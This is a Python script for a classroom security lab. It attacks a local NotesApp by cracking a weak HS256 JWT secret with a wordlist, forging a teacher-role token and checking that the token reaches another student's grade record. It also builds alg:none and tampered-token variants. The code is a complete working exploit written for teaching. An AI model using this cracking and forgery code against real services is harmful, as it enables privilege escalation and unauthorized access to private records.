#!/usr/bin/env python3
"""JWT Part 2 - recover the weak HS256 key and forge a teacher token.

Class 6 lab "Forge a token: become a teacher", Part 2.
Target is a local NotesApp instance running with JWT_ALLOW_NONE=false and the
classroom teaching secret. Only the seed accounts shipped in db/init.sql are
used (alice / alicepw). Standard library only.

Steps performed by this script:
  1. log in as alice with a normal form login and read the JWT the server
     issued (it is embedded in /dashboard);
  2. decode that real token (header / payload / signature);
  3. try every candidate of the course wordlist as the HS256 secret and keep
     the one whose HMAC-SHA256 reproduces the signature of the real token;
  4. sign a teacher token with the recovered key;
  5. run the acceptance checks with a fresh client that never sends a cookie.

Nothing here is a simulation: every status code below comes from a real HTTP
request against the running local service.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import http.client
import json
import os
import re
import sys
import time
import urllib.parse
from datetime import datetime, timezone, timedelta
from pathlib import Path

# --- configuration ------------------------------------------------------------
DEFAULT_BASE = "http://127.0.0.1:8082"

PACKAGE_ROOT = Path(__file__).resolve().parent.parent
WORDLIST_CANDIDATES = (str(PACKAGE_ROOT / "lab" / "jwt-secrets.txt"),)


# --- small helpers ------------------------------------------------------------
def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64url_decode(value: str) -> bytes:
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def now() -> str:
    return datetime.now(timezone(timedelta(hours=8))).isoformat(timespec="seconds")


def split_jwt(token: str):
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("not a three part JWT")
    return parts[0], parts[1], parts[2]


def jwt_header(token: str) -> dict:
    return json.loads(b64url_decode(split_jwt(token)[0]))


def jwt_payload(token: str) -> dict:
    return json.loads(b64url_decode(split_jwt(token)[1]))


def sign_hs256(secret: str, header_b64: str, payload_b64: str) -> str:
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
    digest = hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    return b64url(digest)


def make_token(payload: dict, secret: str | None, alg: str = "HS256") -> str:
    header_b64 = b64url(json.dumps({"alg": alg, "typ": "JWT"}).encode("utf-8"))
    payload_b64 = b64url(json.dumps(payload).encode("utf-8"))
    if secret is None:            # alg:none, empty signature, trailing dot kept
        return f"{header_b64}.{payload_b64}."
    return f"{header_b64}.{payload_b64}.{sign_hs256(secret, header_b64, payload_b64)}"


# --- HTTP client (no cookie jar, no redirect magic) ---------------------------
class Lab:
    """Tiny HTTP client. It never stores or sends cookies unless told to."""

    def __init__(self, base: str, transcript_path: str | None = None):
        parsed = urllib.parse.urlparse(base)
        if (parsed.scheme != "http" or not parsed.hostname or parsed.username
                or parsed.password or parsed.path not in ("", "/") or parsed.query or parsed.fragment):
            raise ValueError("--base must be an HTTP origin, for example http://127.0.0.1:8082")
        self.host = parsed.hostname or "127.0.0.1"
        self.port = parsed.port or 80
        self.transcript = open(transcript_path, "a", encoding="utf-8") if transcript_path else None
        self.exchanges: list[dict] = []

    def close(self):
        if self.transcript:
            self.transcript.close()

    def request(self, method: str, path: str, headers: dict | None = None,
                body: bytes | None = None, label: str = "") -> dict:
        sent = dict(headers or {})
        conn = http.client.HTTPConnection(self.host, self.port, timeout=20)
        try:
            conn.request(method, path, body=body, headers=sent)
            response = conn.getresponse()
            payload = response.read()
            status = response.status
            reason = response.reason
            resp_headers = dict(response.getheaders())
        finally:
            conn.close()

        text = payload.decode("utf-8", "replace")
        exchange = {
            "label": label,
            "method": method,
            "path": path,
            "request_headers": sent,
            "request_cookie_sent": any(k.lower() == "cookie" for k in sent),
            "status": status,
            "reason": reason,
            "response_headers": resp_headers,
            "body": text,
            "at": now(),
        }
        self.exchanges.append(exchange)

        if self.transcript:
            self.transcript.write(f"[{now()}] {method} {path}   ({label})\n")
            for key, value in sent.items():
                self.transcript.write(f"> {key}: {value}\n")
            if not exchange["request_cookie_sent"]:
                self.transcript.write("> (no Cookie header was sent with this request)\n")
            self.transcript.write(f"< HTTP/1.1 {status} {reason}\n")
            for key, value in resp_headers.items():
                self.transcript.write(f"< {key}: {value}\n")
            self.transcript.write(text.strip() + "\n\n")
        return exchange

    # convenience: JSON body parsing
    @staticmethod
    def as_json(exchange: dict):
        try:
            return json.loads(exchange["body"])
        except Exception:
            return None


# --- the lab steps ------------------------------------------------------------
def login_as_alice(lab: Lab, username: str, password: str) -> tuple[str, dict]:
    """Normal form login, then read the JWT the server put in the dashboard."""
    body = urllib.parse.urlencode({"username": username, "password": password}).encode("utf-8")
    login = lab.request(
        "POST", "/login",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        body=body,
        label=f"login as {username}",
    )
    cookie = login["response_headers"].get("Set-Cookie", "")
    if not cookie:
        raise SystemExit(f"login failed (status {login['status']}): {login['body'][:200]}")
    session_cookie = cookie.split(";")[0]

    dash = lab.request(
        "GET", "/dashboard",
        headers={"Cookie": session_cookie},
        label="read dashboard (cookie session)",
    )
    match = re.search(r'const TOKEN\s*=\s*"([^"]+)"', dash["body"])
    if login["status"] != 302 or dash["status"] != 200 or not match:
        raise SystemExit("could not find the issued JWT in /dashboard")
    token = match.group(1)
    if (jwt_header(token).get("alg") != "HS256" or not split_jwt(token)[2]
            or jwt_payload(token).get("role") != "student"
            or jwt_payload(token).get("username") != username):
        raise SystemExit("expected a real signed HS256 student token issued to the login user")
    return token, {"login_status": login["status"], "dashboard_status": dash["status"]}


def recover_key(token: str, wordlist: list[str]) -> dict:
    header_b64, payload_b64, signature = split_jwt(token)
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
    started = time.perf_counter()
    tried = 0
    for candidate in wordlist:
        tried += 1
        digest = hmac.new(candidate.encode("utf-8"), signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(b64url(digest), signature):
            elapsed = time.perf_counter() - started
            return {
                "found": True,
                "key": candidate,
                "key_length": len(candidate),
                "candidates_tried": tried,
                "wordlist_size": len(wordlist),
                "seconds": round(elapsed, 6),
                "computed_signature": b64url(digest),
                "token_signature": signature,
                "signing_input": signing_input.decode("ascii"),
            }
    return {
        "found": False,
        "key": None,
        "candidates_tried": tried,
        "wordlist_size": len(wordlist),
        "seconds": round(time.perf_counter() - started, 4),
    }


def load_wordlist(path: str) -> list[str]:
    words = []
    with open(path, encoding="utf-8") as handle:
        for line in handle:
            line = line.strip()
            if line and not line.startswith("#"):
                words.append(line)
    if not words:
        raise ValueError("wordlist contains no candidates")
    return words


def resolve(explicit: str | None, candidates, label: str) -> str:
    if explicit:
        if not os.path.isfile(explicit):
            raise SystemExit(f"{label} not found: {explicit}")
        return explicit
    here = os.path.dirname(os.path.abspath(__file__))
    for candidate in candidates:
        full = candidate if os.path.isabs(candidate) else os.path.join(here, candidate)
        if os.path.isfile(full):
            return full
    raise SystemExit(f"could not locate {label}; pass it explicitly")


# --- main ---------------------------------------------------------------------
def main() -> int:
    parser = argparse.ArgumentParser(description="NotesApp JWT Part 2 lab")
    parser.add_argument("--base", default=DEFAULT_BASE, help="lab base URL")
    parser.add_argument("--wordlist", default=None, help="candidate list")
    parser.add_argument("--out", default=None, help="evidence output directory")
    parser.add_argument("--username", default="alice")
    parser.add_argument("--password", default="alicepw")
    args = parser.parse_args()
    started_at = now()

    wordlist_path = resolve(args.wordlist, WORDLIST_CANDIDATES, "wordlist")
    out_dir = resolve_dir(args.out)
    wordlist = load_wordlist(wordlist_path)
    if any((Path(out_dir) / name).exists() for name in ("http-transcript.txt", "part2-results.json")):
        parser.error("output already contains evidence; choose a new --out directory")
    os.makedirs(out_dir, exist_ok=True)
    transcript_path = os.path.join(out_dir, "http-transcript.txt")
    if os.path.exists(transcript_path):
        os.remove(transcript_path)

    lab = Lab(args.base, transcript_path)

    print("=" * 78)
    print("NotesApp - JWT Part 2 : weak HS256 key recovery + teacher token")
    print(f"target          : {args.base}")
    print(f"wordlist        : {wordlist_path} ({len(wordlist)} candidates)")
    print(f"evidence folder : {out_dir}")
    print("=" * 78)

    print("\n[1] log in as alice and read the JWT issued by the server")
    real_token, login_info = login_as_alice(lab, args.username, args.password)
    header_b64, payload_b64, signature = split_jwt(real_token)
    print(f"    login status          : {login_info['login_status']} (POST /login)")
    print(f"    dashboard status      : {login_info['dashboard_status']} (GET /dashboard)")
    print(f"    token (3 parts)      : {header_b64}.{payload_b64}.{signature[:12]}...")
    print(f"    header  (decoded)     : {json.dumps(jwt_header(real_token))}")
    print(f"    payload (decoded)     : {json.dumps(jwt_payload(real_token))}")
    print(f"    signature (b64url)    : {signature}")

    print("\n[2] try every wordlist candidate as the HS256 secret")
    recovery = recover_key(real_token, wordlist)
    if not recovery["found"]:
        print("    no candidate reproduced the signature - lab FAILED")
        print(json.dumps(recovery, indent=2))
        lab.close()
        return 2
    key = recovery["key"]
    print(f"    candidates tried      : {recovery['candidates_tried']} / {recovery['wordlist_size']}")
    print(f"    matching candidate    : {key}   (length {recovery['key_length']} characters)")
    print(f"    computed signature    : {recovery['computed_signature']}")
    print(f"    signature in token    : {recovery['token_signature']}")
    print(f"    identical             : {recovery['computed_signature'] == recovery['token_signature']}")
    print(f"    measured search time  : {recovery['seconds']} s (wall clock of this run)")

    print("\n[3] forge a teacher token with the recovered key")
    teacher_payload = {"user_id": 2, "username": "prof.turing", "role": "teacher"}
    forged_token = make_token(teacher_payload, key, alg="HS256")
    print(f"    payload               : {json.dumps(teacher_payload)}")
    print(f"    forged header         : {json.dumps(jwt_header(forged_token))}")
    print(f"    forged token          : {forged_token}")

    none_token = make_token(teacher_payload, None, alg="none")
    tampered = forged_token[:-1] + ("A" if forged_token[-1] != "A" else "B")
    wrong_key_token = make_token(teacher_payload, "definitely-not-the-key")
    student_token = make_token(
        {"user_id": 6, "username": "alice", "role": "student"}, key, alg="HS256")

    print("\n[4] acceptance checks (fresh client, no cookie is ever sent)")
    checks = [
        ("C1", "no credentials at all -> /api/notes/3", "GET", "/api/notes/3", None, 401),
        ("C2", "alg:none token (Part 1 style) -> /api/notes/3", "GET", "/api/notes/3",
         {"Authorization": f"Bearer {none_token}"}, 401),
        ("C3", "real alice JWT -> /api/notes/1", "GET", "/api/notes/1",
         {"Authorization": f"Bearer {real_token}"}, 200),
        ("C4", "real alice JWT -> /api/notes/3 (Class 8 owner check)", "GET", "/api/notes/3",
         {"Authorization": f"Bearer {real_token}"}, 404),
        ("C5", "forged teacher JWT -> /api/notes/3", "GET", "/api/notes/3",
         {"Authorization": f"Bearer {forged_token}"}, 200),
        ("C6", "forged token, signature tampered -> /api/notes/3", "GET", "/api/notes/3",
         {"Authorization": f"Bearer {tampered}"}, 401),
        ("C7", "signed token but role=student -> /api/notes/3", "GET", "/api/notes/3",
         {"Authorization": f"Bearer {student_token}"}, 404),
        ("C8", "token signed with a wrong key -> /api/notes/3", "GET", "/api/notes/3",
         {"Authorization": f"Bearer {wrong_key_token}"}, 401),
    ]

    results = []
    for cid, title, method, path, headers, expected in checks:
        exchange = lab.request(method, path, headers=headers, body=None, label=f"{cid} {title}")
        observed = Lab.as_json(exchange)
        if expected in (401, 404):
            body_ok = observed == {"error": "unauthorized" if expected == 401 else "not found"}
        elif cid == "C3":
            body_ok = isinstance(observed, dict) and all(observed.get(k) == v for k, v in {
                "id": 1, "student_id": 6, "student": "alice", "class_name": "Mathematics",
                "grade": 16.2, "comment": "Late submission, but good quality."}.items())
        else:
            body_ok = isinstance(observed, dict) and all(observed.get(k) == v for k, v in {
                "id": 3, "student_id": 7, "student": "bob", "class_name": "Mathematics",
                "grade": 12.6, "comment": "Solid work, keep it up."}.items())
        ok = exchange["status"] == expected and body_ok and not exchange["request_cookie_sent"]
        body = exchange["body"].strip().replace("\n", " ")
        if len(body) > 160:
            body = body[:160] + "..."
        print(f"    {cid} {title}")
        print(f"        expected {expected} | got {exchange['status']} "
              f"{exchange['reason']} | cookie sent: {exchange['request_cookie_sent']} "
              f"| {'PASS' if ok else 'FAIL'}")
        print(f"        body: {body}")
        results.append({
            "id": cid,
            "check": title,
            "method": method,
            "path": path,
            "expected_status": expected,
            "actual_status": exchange["status"],
            "reason": exchange["reason"],
            "pass": ok,
            "body_matches_expected": body_ok,
            "cookie_sent": exchange["request_cookie_sent"],
            "request_headers": exchange["request_headers"],
            "response_headers": exchange["response_headers"],
            "body": exchange["body"],
            "at": exchange["at"],
        })

    bob = None
    for item in results:
        if item["id"] == "C5":
            payload = Lab.as_json(item)
            if isinstance(payload, dict):
                bob = payload
    print("\n[5] what the forged teacher identity actually received")
    if bob:
        print(f"    note id    : {bob.get('id')}")
        print(f"    student    : {bob.get('student')}")
        print(f"    class      : {bob.get('class_name')}")
        print(f"    grade      : {bob.get('grade')}")
        print(f"    comment    : {bob.get('comment')}")
    else:
        print("    no JSON body captured for C5")

    lab.close()

    report = {
        "lab": {
            "target": args.base,
            "started_at": started_at,
            "finished_at": now(),
            "wordlist": wordlist_path,
            "wordlist_size": len(wordlist),
            "evidence_dir": out_dir,
        },
        "login": login_info,
        "real_token": {
            "header": jwt_header(real_token),
            "payload": jwt_payload(real_token),
            "signature": signature,
        },
        "key_recovery": recovery,
        "forged_token": {
            "payload": teacher_payload,
            "header": jwt_header(forged_token),
            "token": forged_token,
        },
        "checks": results,
        "bob_note_3": bob,
        "overall_passed": len(results) == 8 and all(item["pass"] for item in results),
    }
    json_path = os.path.join(out_dir, "part2-results.json")
    with open(json_path, "w", encoding="utf-8") as handle:
        json.dump(report, handle, indent=2, ensure_ascii=False)

    csv_path = os.path.join(out_dir, "http-status.csv")
    with open(csv_path, "w", encoding="utf-8", newline="") as handle:
        handle.write("id,check,method,path,expected_status,actual_status,cookie_sent,result,at\n")
        for item in results:
            handle.write("{id},{check},{method},{path},{expected_status},{actual_status},{cookie_sent},{result},{at}\n".format(
                id=item["id"],
                check='"' + item["check"].replace('"', "'") + '"',
                method=item["method"],
                path=item["path"],
                expected_status=item["expected_status"],
                actual_status=item["actual_status"],
                cookie_sent=item["cookie_sent"],
                result="PASS" if item["pass"] else "FAIL",
                at=item["at"],
            ))

    wordlist_path_out = os.path.join(out_dir, "wordlist-hit.txt")
    with open(wordlist_path_out, "w", encoding="utf-8") as handle:
        handle.write(f"wordlist              : {wordlist_path}\n")
        handle.write(f"candidates in list    : {recovery['wordlist_size']}\n")
        handle.write(f"candidates tried      : {recovery['candidates_tried']}\n")
        handle.write(f"recovered HS256 secret: {key}  ({recovery['key_length']} characters)\n")
        handle.write(f"signing input         : {recovery['signing_input']}\n")
        handle.write(f"computed signature    : {recovery['computed_signature']}\n")
        handle.write(f"signature of real JWT : {recovery['token_signature']}\n")
        handle.write(f"signatures identical  : {recovery['computed_signature'] == recovery['token_signature']}\n")
        handle.write(f"measured search time  : {recovery['seconds']} s\n")

    passed = sum(1 for item in results if item["pass"])
    print("\n" + "=" * 78)
    print(f"checks passed: {passed}/{len(results)}")
    print(f"evidence     : {json_path}")
    print(f"               {csv_path}")
    print(f"               {transcript_path}")
    print(f"               {wordlist_path_out}")
    print("=" * 78)
    return 0 if passed == len(results) else 1


def resolve_dir(explicit: str | None) -> str:
    if explicit:
        return str(Path(explicit).resolve())
    stamp = datetime.now(timezone(timedelta(hours=8))).strftime("%Y%m%d-%H%M%S-%f")
    return str(PACKAGE_ROOT / "evidence" / "reruns" / stamp)


if __name__ == "__main__":
    sys.exit(main())
